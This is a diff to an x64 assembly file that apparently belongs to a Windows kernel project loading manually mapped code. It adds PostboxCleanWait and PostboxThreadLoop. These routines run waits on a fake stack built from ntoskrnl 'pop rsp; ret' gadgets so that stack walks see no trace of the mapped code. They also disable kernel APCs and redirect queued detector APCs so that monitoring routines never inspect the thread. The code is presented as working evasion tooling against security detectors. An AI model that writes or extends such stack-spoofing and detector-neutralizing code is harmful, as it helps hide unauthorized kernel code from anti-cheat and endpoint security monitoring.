@@ -157,6 +157,120 @@ PostboxMmCopySpoof:
     movq %r11, %rsp
     jmp *g_PostboxMmCopyTarget(%rip)
 
+# APC-stackwalk clean wait. The caller (PostboxThreadLoop) calls this with the
+# Windows x64 ABI: rcx = target (KeDelayExecutionThread), rdx = Alertable,
+# r8 = WaitMode, r9 = Interval. The target runs on a fake stack below the
+# caller's RSP; its return address is an nt `pop rsp; ret` gadget and the real
+# RSP lives on the fake stack, not in a global. While the target blocks, a
+# stack walk sees the nt gadget and the fake frame, not the mapped return slot
+# of the caller.
+    .globl PostboxCleanWait
+PostboxCleanWait:
+    # Caller convention: rcx = target, rdx = Alertable, r8 = WaitMode,
+    # r9 = Interval. KeDelayExecutionThread wants rcx = WaitMode,
+    # rdx = Alertable, r8 = Interval. Save the target and shuffle the ABI
+    # arguments before entering the target; otherwise r8 is 0/1 and the
+    # target dereferences it as the Interval pointer.
+    movq %rcx, %rax                 # target
+    movq %r8, %rcx                  # WaitMode -> RCX
+    movq %r9, %r8                   # Interval -> R8
+    movq %rsp, %r10                 # real RSP (points at caller return slot)
+    leaq -0x100(%rsp), %r11
+    andq $-16, %r11
+    subq $8, %r11                   # fake RSP, 16-byte aligned
+
+    # Shadow-space-safe chain: the target returns with RSP = fake+8, then
+    # `add rsp,0x28; ret` lands on fake+0x30 and pops the `pop rsp; ret` slot
+    # there. That ret leaves RSP = fake+0x38, and pop rsp loads the real RSP
+    # from fake+0x38. The chain slot must be 0x30, not 0x28: the 0x28 add is
+    # applied after the target's return slot has already been popped. A callee
+    # spilling its register arguments at fake+8..0x27 cannot corrupt it.
+    movq g_PostboxPopRspRetSkip(%rip), %r9
+    testq %r9, %r9
+    jz 2f
+    movq %r9, 0(%r11)               # target return = add rsp,0x28; ret
+    movq g_PostboxPopRspRet(%rip), %r9
+    testq %r9, %r9
+    jz 2f
+    movq %r9, 0x30(%r11)            # return chain = pop rsp; ret
+    movq %r10, 0x38(%r11)           # pop rsp loads the real RSP
+    movq %r11, %rsp
+    jmp *%rax
+2:
+    # Legacy fallback if the skip gadget is unavailable.
+    movq g_PostboxPopRspRet(%rip), %r9
+    testq %r9, %r9
+    jz 3f
+    movq %r9, 0(%r11)
+    movq %r10, 8(%r11)
+    movq %r11, %rsp
+    jmp *%rax
+3:
+    jmp *%rax
+
+# APC-stackwalk thread loop. The mapped work is a step function that returns
+# 1 to continue or 0 to stop. APCs are disabled while the step runs, so a
+# detector cannot capture its mapped frames. The wait is called directly from
+# this stub through PostboxCleanWait; there is no C wrapper frame left on the
+# stack while the target blocks.
+#
+# Context (all qwords):
+#   0x00 State
+#   0x08 Step
+#   0x10 WaitTarget
+#   0x18 WaitInterval (LARGE_INTEGER, 100 ns units)
+#   0x20 EnterCritical
+#   0x28 LeaveCritical
+    .globl PostboxThreadLoop
+PostboxThreadLoop:
+    pushq %rbx
+    pushq %r12
+    pushq %r13
+    subq $0x30, %rsp                # 3 pushes + 0x30 keeps calls 16-byte aligned
+    movq %rcx, %rbx
+    movq 0x00(%rbx), %r12
+    movq 0x08(%rbx), %r13
+
+    # Keep kernel APCs disabled for the whole loop: both the mapped step and
+    # the mapped wait run with APCs off, so a detector APC stays queued instead
+    # of walking this stack. The neutralizer below redirects the detector's
+    # queued KAPC KernelRoutine before the region is left.
+    movq 0x20(%rbx), %rax
+    testq %rax, %rax
+    jz 1f
+    call *%rax
+1:
+    movq %r12, %rcx
+    call *%r13
+    testl %eax, %eax
+    jz 9f
+
+    # Neutralize any detector APC queued during the step, then wait with APCs
+    # still disabled. The wait timer expires normally.
+    call PostboxNeutralizeDetectorApcs
+    leaq 0x18(%rbx), %rcx
+    call PostboxSpoofedThreadWait
+    jmp 1b
+
+9:
+    # Neutralize the last pending detector APC(s), then balance the critical
+    # region. Leaving delivers the patched APCs; the neutralizer frees each one
+    # without capturing this thread's mapped stack. The APC-disable count must
+    # reach zero or PspExitThread bugchecks 0x20 (Arg1=0, Arg2=0xFFFF).
+    call PostboxNeutralizeDetectorApcs
+    movq 0x28(%rbx), %rax
+    testq %rax, %rax
+    jz 8f
+    call *%rax
+8:
+    # Drain any remaining (non-detector) kernel APCs before thread exit.
+    call PostboxDrainThreadApcs
+    addq $0x30, %rsp
+    popq %r13
+    popq %r12
+    popq %rbx
+    ret
+
 # Test-only probe target: records the return address it was entered with. When
 # called through the shadow thunk, this is the nt jump gadget.
     .globl PostboxStackProbeTarget
